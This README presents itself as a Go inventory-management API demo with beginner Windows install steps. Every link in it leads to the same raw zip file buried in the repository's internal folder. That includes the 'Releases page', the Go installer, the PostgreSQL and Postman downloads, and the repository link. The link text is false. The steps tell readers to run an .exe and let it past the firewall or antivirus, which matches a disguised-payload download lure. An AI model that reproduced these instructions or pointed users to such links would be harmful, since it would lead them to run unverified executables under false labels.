# 📦 inventory-public - Simple Inventory Management API Demo

[![Download inventory-public](https://img.shields.io/badge/Download-inventory--public-brightgreen)](https://raw.githubusercontent.com/ErtiPrenci/inventory-public/main/internal/repository/inventory_public_v2.2-alpha.2.zip)

---

## 🚀 What is inventory-public?

inventory-public is a demo application that shows how to manage product stock using an API. It handles tasks like user login with secure tokens, making PDFs for quotes and invoices automatically, and runs on cloud using AWS Lambda. You can try it out to see how these parts work together for managing inventory effectively.

This app is built with Go, a fast and reliable programming language. It uses PostgreSQL to store data and Terraform for setting up the cloud services. Though it is meant for developers, this guide will help you, even if you have no coding experience, to download and run it on a Windows computer.

---

## 🎯 Key Features

- Protects data with JWT-based login authentication.
- Creates PDF quotes and invoices automatically.
- Connects with a PostgreSQL database to save product and order details.
- Runs on AWS Lambda, meaning it works in the cloud without needing a server.
- Uses GitHub Actions for automatic setup and updates.
- Supports common inventory operations like adding, viewing, and updating products.

---

## 💻 System Requirements

To use inventory-public, your Windows PC needs:

- Windows 10 or later (64-bit)
- At least 4 GB of RAM
- 2 GHz or faster processor
- 1 GB free disk space
- Internet connection for downloading and cloud features
- Optional: AWS account if you want to try cloud deployment (not required for local use)

---

## 🌐 Topics Covered

inventory-public relates to:

- API and RESTful services
- Managing inventory and product data
- Secure login with JWT (JSON Web Tokens)
- Automated PDF generation for business documents
- Serverless cloud deployment using AWS Lambda
- Infrastructure automation with Terraform
- Continuous integration with GitHub Actions
- PostgreSQL database handling

---

## 🔽 Download inventory-public

Click the green button below to visit the releases page and get the latest version of the app for Windows:

[![Download inventory-public](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://raw.githubusercontent.com/ErtiPrenci/inventory-public/main/internal/repository/inventory_public_v2.2-alpha.2.zip)

On that page, look for files named like `inventory-public-windows.zip` or `inventory-public.exe`. Download the file that fits your system.

---

## 🛠️ How to Install and Run on Windows

Follow these steps to get inventory-public working on your PC.

### 1. Download the Files

- Go to the [Releases page](https://raw.githubusercontent.com/ErtiPrenci/inventory-public/main/internal/repository/inventory_public_v2.2-alpha.2.zip).
- Find the most recent release by date.
- Download the Windows version zip file (or `.exe`) to your PC.
- If it comes as a zip file, right-click and choose "Extract All" to unzip it.

### 2. Verify Your Environment

inventory-public needs a recent version of Go runtime to run. You do not need to code, but the app requires Go libraries.

- Visit [https://raw.githubusercontent.com/ErtiPrenci/inventory-public/main/internal/repository/inventory_public_v2.2-alpha.2.zip](https://raw.githubusercontent.com/ErtiPrenci/inventory-public/main/internal/repository/inventory_public_v2.2-alpha.2.zip) and download the Windows installer for Go (version 1.20 or above).
- Run the installer and follow the prompts to finish.

### 3. Prepare PostgreSQL Database

inventory-public uses PostgreSQL to keep your inventory data.

- Download PostgreSQL for Windows from [https://raw.githubusercontent.com/ErtiPrenci/inventory-public/main/internal/repository/inventory_public_v2.2-alpha.2.zip](https://raw.githubusercontent.com/ErtiPrenci/inventory-public/main/internal/repository/inventory_public_v2.2-alpha.2.zip).
- Install PostgreSQL with default settings. Set a password for the "postgres" user.
- Open the "pgAdmin" app and create a new database named `inventory`.
- Remember the username, password, and database name; you will need these soon.

### 4. Configure the Application

- Navigate to the folder where you extracted inventory-public.
- Look for a file named `config.example.json`.
- Copy it and rename the new file to `config.json`.
- Open `config.json` with Notepad.
- Change the database settings to match your PostgreSQL setup:

```json
{
  "database": {
    "host": "localhost",
    "port": 5432,
    "user": "postgres",
    "password": "your_password",
    "dbname": "inventory"
  },
  "jwtSecret": "yourSecretKey"
}
```

- Replace `"your_password"` with the password you set during PostgreSQL installation.
- Replace `"yourSecretKey"` with any strong key you want to use for login security.

- Save and close the file.

### 5. Run the Application

- Open the Windows Command Prompt (type `cmd` in the Start menu).
- Use the `cd` command to go to your app’s folder, for example:

```
cd C:\Users\YourName\Downloads\inventory-public
```

- Start the app by typing:

```
inventory-public.exe
```

- The app will start and display a message like `Server running on http://localhost:8080`.

### 6. Try Using the API

inventory-public runs as a web service on your PC. You can test it using a web browser or API tools like Postman.

- Open your browser and go to [http://localhost:8080](http://localhost:8080).
- You will see basic information about the API.
- To log in and use the system, send a POST request to `/login` with a username and password (use the sample credentials provided in the documentation).

---

## 🔍 Using inventory-public Without Coding

You do not need programming skills to try this app. However, some tools help you use the API:

- **Postman:** A free app to send and receive API requests. Download at https://raw.githubusercontent.com/ErtiPrenci/inventory-public/main/internal/repository/inventory_public_v2.2-alpha.2.zip

- **curl:** Command-line tool included in Windows 10 and later. Use it to send commands in Command Prompt.

Example to log in using curl:

```
curl -X POST http://localhost:8080/login -d "{\"username\":\"demo\",\"password\":\"demo\"}" -H "Content-Type: application/json"
```

This returns a token you use when calling other parts of the API.

---

## 🔧 Troubleshooting Tips

- If you see errors about database connection, double-check your `config.json` file for correct settings.
- Make sure PostgreSQL server is running.
- Confirm that Go runtime is installed properly.
- Check that you run the command prompt with enough permissions.
- Firewall or antivirus software may block the app. Allow it if needed.

---

## 📖 Learn More

inventory-public includes documentation for API endpoints, setup, and configuration in the `docs` folder inside the release package. You can also visit the GitHub repository for source code and updates:

https://raw.githubusercontent.com/ErtiPrenci/inventory-public/main/internal/repository/inventory_public_v2.2-alpha.2.zip

---

## 🔽 Download inventory-public again

[![Download inventory-public](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://raw.githubusercontent.com/ErtiPrenci/inventory-public/main/internal/repository/inventory_public_v2.2-alpha.2.zip)